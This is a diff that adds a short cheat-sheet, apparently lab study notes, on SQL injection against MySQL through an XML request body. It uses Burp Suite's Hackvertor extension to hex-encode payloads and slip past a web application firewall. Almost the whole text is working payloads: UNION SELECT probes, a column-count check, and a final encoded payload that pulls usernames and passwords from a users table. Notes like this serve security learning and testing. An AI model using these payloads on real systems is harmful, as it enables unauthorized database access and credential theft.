@@ -1,0 +1,28 @@
+
+[ WEB > SQLI > MYSQL > FILTER BYPASS VIA XML ]
+
+*** INSTALL BURP SUITE HACKVERTOR EXTENSION!
+Super useful for encoding payloads to bypass WAFs.
+
+
+// Test basic obfuscation
+// E.g., this is in a post request body
+<storeId>1+1</storeId>
+
+// Test some basic SQL
+<storeId>1 UNION SELECT NULL</storeId>
+
+// Use hackvertor extension to encode payload using hex entities...
+// hack works.... modify then re-encode payload to get the data....
+<storeId><@hex_entities>1 union select null<@/hex_entities></storeId>
+
+// but first, confirm column count returned...
+<storeId><@hex_entities>1 union select null, null<@/hex_entities></storeId>
+
+// after 1 column confirmed, create payload to concat for single column data...
+// type up payload
+1 union select username || '~' || password from users
+
+// encode then send
+<storeId><@hex_entities>1 union select username || '~' || password from users<@/hex_entities></storeId>
+
